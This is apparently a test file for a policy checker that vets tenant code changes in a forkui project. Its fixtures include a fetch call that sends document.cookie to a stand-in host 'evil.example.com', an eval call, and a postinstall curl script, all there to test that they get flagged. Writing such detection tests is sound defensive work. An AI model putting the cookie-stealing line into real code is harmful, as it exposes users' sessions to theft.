import { afterEach, describe, expect, test } from 'vitest';
import { join } from 'node:path';
import { parseConfig } from '@forkui/core';
import { GitStore, type Worktree } from '@forkui/git';
import { checkPolicy } from '../src/index.ts';
import { baseConfig, tmp, v1Files, vendorRepo, writeFiles } from '../../../test/helpers.ts';

let cleanups: (() => Promise<void> | void)[] = [];
afterEach(async () => {
  for (const c of cleanups.reverse()) await c();
  cleanups = [];
});

const config = parseConfig(JSON.stringify(baseConfig));

async function setup(tenantFiles: Record<string, string> = {}) {
  const t = tmp('policy');
  cleanups.push(t.cleanup);
  const vendor = vendorRepo(join(t.dir, 'vendor'));
  vendor.commit(v1Files, 'v1');
  const store = await GitStore.init(join(t.dir, 'store'));
  await store.importBase(vendor.dir, 'refs/heads/main', 'v1');
  const { sha } = await store.createTenant('acme', 'v1');
  let head = sha;
  if (Object.keys(tenantFiles).length) {
    const w = await store.worktree('refs/heads/tenants/acme');
    writeFiles(w.path, tenantFiles);
    head = await w.commitIntent('tenant intent', { intentId: 'a1', intent: 'x', test: 'forkui-tests/a1.spec.tsx' });
    await store.updateTenant('acme', head, sha);
    await w.dispose();
  }
  const wt = await store.worktree('refs/heads/tenants/acme');
  cleanups.push(() => wt.dispose());
  return { store, wt, head };
}

const rulesOf = async (wt: Worktree, extra: Partial<Parameters<typeof checkPolicy>[0]> = {}) =>
  (await checkPolicy({ worktree: wt, config, baseRef: 'refs/tags/base/v1', ...extra })).violations.map((v) => `${v.rule}:${v.path}`);

describe('checkPolicy', () => {
  test('a normal tenant change passes', async () => {
    const { wt } = await setup();
    writeFiles(wt.path, {
      'src/Table.tsx': "export const Table = () => <table><th>Priority</th></table>;\nfetch('/api/deals');\n",
      'src/New.tsx': "export const New = () => fetch('https://api.acme.test/v1/x');\n",
      'forkui-tests/a1.spec.tsx': 'test',
    });
    expect(await rulesOf(wt)).toEqual([]);
  });

  test('locked, vendor-owned and config paths are rejected (including untracked files)', async () => {
    const { wt } = await setup();
    writeFiles(wt.path, {
      'src/auth/session.ts': 'export const session = 2;\n',
      'src/test/newHelper.ts': 'x',
      'forkui.config.json': '{}',
    });
    const got = (await rulesOf(wt)).sort();
    expect(got, `violations: ${JSON.stringify(got)}; status: ${(await wt.git(['status', '--porcelain'])).stdout}`).toEqual([
      'locked-path:forkui.config.json',
      'locked-path:src/auth/session.ts',
      'vendor-owned-path:src/test/newHelper.ts',
    ]);
  });

  test('same-size edits made right after checkout are still detected (racy-git timestamps)', async () => {
    for (let i = 0; i < 5; i++) {
      const { wt } = await setup();
      // Same byte length as the original, written immediately: the case git's stat cache can miss.
      writeFiles(wt.path, { 'src/auth/session.ts': 'export const session = 2;\n' });
      expect(await rulesOf(wt)).toEqual(['locked-path:src/auth/session.ts']);
    }
  });

  test('dependencies: allowlist, and nothing else in package.json may change', async () => {
    const { wt } = await setup();
    writeFiles(wt.path, {
      'package.json': JSON.stringify({ name: 'acme', dependencies: { react: '18.3.1', 'date-fns': '4.1.0', 'left-pad': '1.0.0' } }),
    });
    const v = await checkPolicy({ worktree: wt, config, baseRef: 'refs/tags/base/v1' });
    expect(v.violations.map((x) => x.message)).toEqual([expect.stringContaining('left-pad')]);

    writeFiles(wt.path, { 'package.json': JSON.stringify({ name: 'acme', scripts: { postinstall: 'curl x' }, dependencies: { react: '18.3.1' } }) });
    expect(await rulesOf(wt)).toEqual(['locked-path:package.json']);
  });

  test('forbidden code, disallowed hosts and conflict markers are flagged with line numbers', async () => {
    const { wt } = await setup();
    writeFiles(wt.path, {
      'src/Evil.tsx': [
        'export const a = 1;',
        "fetch('https://evil.example.com/steal?c=' + document.cookie);",
        'eval(x);',
        '<<<<<<< HEAD',
      ].join('\n'),
    });
    const r = await checkPolicy({ worktree: wt, config, baseRef: 'refs/tags/base/v1' });
    expect(r.ok).toBe(false);
    expect(r.violations.map((v) => `${v.rule}@${v.line}`).sort()).toEqual([
      'conflict-marker@4',
      'forbidden-code@2',
      'forbidden-code@3',
      'network-host-not-allowed@2',
    ]);
  });

  test('existing tenant tests are frozen unless the change is approved', async () => {
    const { wt, head } = await setup({ 'forkui-tests/a1.spec.tsx': 'original test', 'forkui-tests/a1.spec.md': 'original spec' });
    writeFiles(wt.path, { 'forkui-tests/a1.spec.tsx': 'weakened test' });
    expect(await rulesOf(wt, { previousTenantRef: head })).toEqual(['tenant-test-modified:forkui-tests/a1.spec.tsx']);
    expect(await rulesOf(wt, { previousTenantRef: head, approvedTestChanges: ['forkui-tests/a1.spec.tsx'] })).toEqual([]);
    await wt.git(['rm', '-q', 'forkui-tests/a1.spec.md']);
    expect(await rulesOf(wt, { previousTenantRef: head, approvedTestChanges: ['forkui-tests/a1.spec.tsx'] })).toEqual([
      'tenant-test-modified:forkui-tests/a1.spec.md',
    ]);
  });
});
